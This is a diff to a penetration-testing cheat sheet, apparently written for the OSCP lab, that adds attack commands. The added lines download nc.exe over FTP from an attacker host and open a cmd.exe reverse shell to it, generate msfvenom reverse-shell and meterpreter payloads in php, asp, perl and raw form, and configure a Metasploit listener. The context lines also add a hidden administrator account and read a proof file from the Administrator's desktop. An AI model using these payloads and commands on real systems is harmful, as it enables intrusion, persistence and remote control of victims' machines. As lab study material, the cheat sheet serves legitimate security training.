@@ -133,19 +133,40 @@ netsh firewall set service remotedesktop enable*
     *$ net user test 1234 /add
 $ net localgroup administrators test /add*
 
+Transferring files
+    with ftp (run ftp.sh in your box):
+    *echo open 10.11.0.123 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo ftp>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+nc.exe 10.11.0.123 1234 -e cmd.exe*
+
+    With RDP:
+    *$ rdesktop (ip) -r disk:share=/home/bayo/store*
+
 Metasploit
     *msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.123 -o meterpreter.php
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.123 -f asp -o shell.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
-
+Generate php reverse shell:
+msfvenom -p generic/shell_reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f php -o shell.php
+Generate shellcode to use within a perl exploit:
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.123 LPORT=443 -f perl -b \x00\x0A\x0D\xFF
+Raw paylaod:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f raw -o test.bin
+Handling reverse shell using meterpreter:
 msf > use exploit/multi/handler
 msf > set lport 1234
 msf > set lhost 10.11.0.123
 msf > set payload windows/shell/reverse_tcp
 or
 set PAYLOAD windows/meterpreter/reverse_tcp
+or
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
 msf > run*
 
 Get proof
-    *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null*
+    *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
